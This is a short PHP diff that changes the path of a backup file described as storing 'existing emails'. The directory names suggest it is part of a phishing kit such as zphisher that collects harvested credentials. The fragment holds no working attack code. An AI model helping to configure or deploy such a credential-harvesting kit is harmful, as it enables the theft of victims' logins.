@@ -1,6 +1,6 @@
 <?php
 // Specified file path for storing existing emails
-$specified_file_path = '/home/kali/micro/auth/backup.txt';
+$specified_file_path = '/home/ShadowTEAM-Guest/zphisher/auth/backup.txt';
 
 // Check if the backup file exists
 if (file_exists($specified_file_path)) {
